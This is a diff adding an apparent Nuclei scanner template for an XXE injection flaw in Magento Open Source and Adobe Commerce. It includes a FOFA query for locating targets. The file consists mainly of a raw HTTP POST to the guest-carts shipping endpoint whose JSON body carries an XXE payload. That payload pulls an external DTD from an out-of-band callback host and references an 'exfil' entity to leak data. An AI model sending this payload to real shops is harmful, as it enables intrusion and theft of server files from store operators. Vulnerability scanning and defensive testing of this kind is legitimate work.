@@ -1,0 +1,41 @@
+id: magento-open-source-xxe
+
+info:
+  name: Magento Open Source XXE注入漏洞（XML实体处理组件）
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="Adobe-Magento"
+      Adobe Commerce及Magento Open Source的多个版本中发现XML外部实体注入漏洞，攻击者可通过精心构造的XML文件利用此漏洞执行任意命令。
+  tags: Magento
+
+http:
+- raw:
+  - |
+    POST /rest/all/V1/guest-carts/test-assetnote/estimate-shipping-methods HTTP/1.1
+    Host: {{Hostname}}
+    Accept: application/json, text/javascript, */*; q=0.01
+    X-Requested-With: XMLHttpRequest
+    Content-Type: application/json
+
+    {
+      "address": {
+        "totalsReader": {
+          "collectorList": {
+            "totalCollector": {
+              "sourceData": {
+                "data": "<?xml version=\"1.0\" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM \"http://{{interactsh-url}}/dtd.xml\"> %sp; %param1; ]> <r>&exfil;</r>",
+                "options": 16
+              }
+            }
+          }
+        }
+      }
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: interactsh_protocol
+    words:
+      - http
